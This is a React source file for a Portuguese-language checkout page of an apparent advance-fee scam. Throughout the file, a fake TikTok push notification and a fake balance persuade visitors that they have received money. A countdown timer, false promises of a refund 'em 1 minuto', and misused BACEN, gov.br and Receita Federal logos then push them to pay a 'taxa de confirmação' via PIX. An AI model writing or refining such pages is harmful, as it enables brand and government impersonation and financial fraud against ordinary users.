import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CheckCircle2, RefreshCw } from "lucide-react";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";
import { TARGET_BALANCE } from "@/lib/constants";
import tiktokLogo from "@/assets/tiktok-logo.png";
import bacenLogo from "@/assets/bacen-logo.png";
import govbrLogo from "@/assets/govbr-logo.png";
import receitaLogo from "@/assets/receita-federal-logo.png";

const TARGET = TARGET_BALANCE;
const TAX = 32.71;

const Checkout = () => {
  const nome = localStorage.getItem("tiktok_nome") || "—";
  const tipoChave = localStorage.getItem("tiktok_tipo_chave") || "—";
  const chavePix = localStorage.getItem("tiktok_chave_pix") || "—";
  const today = new Date().toLocaleDateString("pt-BR");

  const [countdown, setCountdown] = useState(15 * 60);
  const [showNotification, setShowNotification] = useState(false);
  const [dismissNotification, setDismissNotification] = useState(false);

  useEffect(() => {
    trackTikTokEvent({ event: "InitiateCheckout", properties: { value: TARGET, currency: "BRL" } });
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Show push notification after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => setShowNotification(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  // Auto-dismiss after 6 seconds
  useEffect(() => {
    if (showNotification) {
      const timer = setTimeout(() => setDismissNotification(true), 6000);
      return () => clearTimeout(timer);
    }
  }, [showNotification]);

  const mins = Math.floor(countdown / 60);
  const secs = countdown % 60;
  const pad = (n: number) => String(n).padStart(2, "0");

  const navigate = useNavigate();

  const handlePagar = () => {
    navigate("/pagamento");
  };

  const now = new Date();
  const notifTime = `${pad(now.getHours())}:${pad(now.getMinutes())}`;

  return (
    <div className="flex min-h-screen flex-col bg-white relative">
      {/* Simulated Push Notification */}
      {showNotification && !dismissNotification && (
        <div
          className="fixed top-3 left-3 right-3 z-[9999] cursor-pointer"
          onClick={() => setDismissNotification(true)}
          style={{ animation: "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)" }}
        >
          <div
            className="rounded-[20px] p-4 mx-auto max-w-md border border-white/10"
            style={{
              background: "linear-gradient(135deg, rgba(40,40,40,0.85) 0%, rgba(30,30,30,0.9) 100%)",
              backdropFilter: "blur(40px)",
              WebkitBackdropFilter: "blur(40px)",
              boxShadow: "0 8px 32px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.08)",
            }}
          >
            <div className="flex items-start gap-3">
              <img
                src={tiktokLogo}
                alt="TikTok"
                className="h-11 w-11 rounded-[12px] object-contain bg-black p-1.5 shrink-0 shadow-sm"
              />
              <div className="flex-1 min-w-0">
                <div className="flex items-baseline justify-between gap-2 mb-0.5">
                  <span className="text-[15px] font-bold text-white leading-tight">Transferência recebida</span>
                  <span className="text-[12px] text-white/50 shrink-0 font-medium">agora</span>
                </div>
                <p className="text-[13px] text-white/80 leading-snug mt-0.5">
                  Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
      {/* Logo */}
      <div className="flex justify-center py-6">
        <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
      </div>

      <div className="px-4 space-y-4 pb-10">
        {/* Saldo Card */}
        <div className="rounded-2xl bg-black p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-1">Saldo disponível</p>
          <p className="text-3xl font-extrabold text-white">
            R$ {TARGET.toFixed(2).replace(".", ",")}
          </p>
          <p className="text-xs text-gray-500 mt-1">Aguardando confirmação para saque</p>
        </div>

        {/* Confirmação de Identidade */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-3">Confirmação de identidade</p>
          <div className="flex items-center gap-2 mb-3">
            <span className="text-2xl font-normal text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span>
            <span className="rounded-full bg-green-100 text-green-600 text-[10px] font-bold px-2 py-0.5 uppercase">Valor reembolsável</span>
          </div>
          <p className="text-xs text-gray-500 leading-relaxed">
            Taxa obrigatória para liberação do saque no valor de{" "}
            <span className="font-bold text-black">R$ {TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
            <span className="font-bold text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
          </p>
        </div>

        {/* Dados para Reembolso */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Dados para reembolso</p>
          <div className="space-y-3">
            <div className="flex justify-between border-b border-gray-100 pb-3 gap-4">
              <span className="text-sm text-gray-500 shrink-0">Nome</span>
              <span className="text-sm font-semibold text-black text-right break-words min-w-0">{nome}</span>
            </div>
            <div className="flex items-center justify-between border-b border-gray-100 pb-3">
              <span className="text-sm text-gray-500">Data</span>
              <span className="text-sm font-semibold text-black">{today}</span>
            </div>
            <div className="flex items-center justify-between border-b border-gray-100 pb-3">
              <span className="text-sm text-gray-500">Chave PIX</span>
              <span className="text-sm font-semibold text-black capitalize">{tipoChave}</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-500">Valor a receber</span>
              <span className="text-sm font-bold text-black">R$ {TARGET.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
            </div>
          </div>
          <div className="mt-4 rounded-xl border border-gray-200 py-3 text-center">
            <p className="text-sm text-gray-600">{chavePix}</p>
          </div>
        </div>

        {/* Processo de Liberação */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <p className="text-[10px] font-semibold text-gray-400 tracking-widest uppercase mb-4">Processo de liberação</p>
          <div className="space-y-4">
            <div className="flex items-start gap-3">
              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">1</span>
              <div>
                <p className="text-sm font-semibold text-black">Pagar taxa de confirmação</p>
                <p className="text-xs text-gray-400">R$ {TAX.toFixed(2).replace(".", ",")} para verificação de identidade</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <CheckCircle2 className="h-7 w-7 shrink-0 text-green-500" />
              <div>
                <p className="text-sm font-semibold text-green-500">Receber reembolso automático</p>
                <p className="text-xs text-gray-400">Valor devolvido em 1 minuto</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-gray-100 text-xs font-bold text-black">3</span>
              <div>
                <p className="text-sm font-semibold text-black">Acessar saldo completo</p>
                <p className="text-xs text-gray-400 underline">R$ {TARGET.toFixed(2).replace(".", ",")} liberado para saque</p>
              </div>
            </div>
          </div>
        </div>

        {/* CTA */}
        <Button
          onClick={handlePagar}
          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
        >
          Liberar Saque
        </Button>

        {/* Reembolso info */}
        <div className="flex items-center justify-center gap-2">
          <RefreshCw className="h-4 w-4 text-green-500" />
          <span className="text-xs font-medium text-green-500">Reembolso automático em 1 minuto</span>
        </div>

        {/* Trust badges */}
        <div className="flex items-center justify-center gap-8 py-4">
          <div className="flex flex-col items-center">
            <img src={bacenLogo} alt="BACEN" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
          </div>
          <div className="flex flex-col items-center">
            <img src={govbrLogo} alt="gov.br" className="h-8 object-contain" loading="eager" decoding="async" />
          </div>
          <div className="flex flex-col items-center">
            <img src={receitaLogo} alt="Receita Federal" className="h-10 w-10 object-contain" loading="eager" decoding="async" />
          </div>
        </div>

        <p className="text-xs text-gray-400 text-center">Processo 100% seguro</p>
        <p className="text-xs text-primary text-center font-medium">Precisa de ajuda?</p>
      </div>
    </div>
  );
};

export default Checkout;
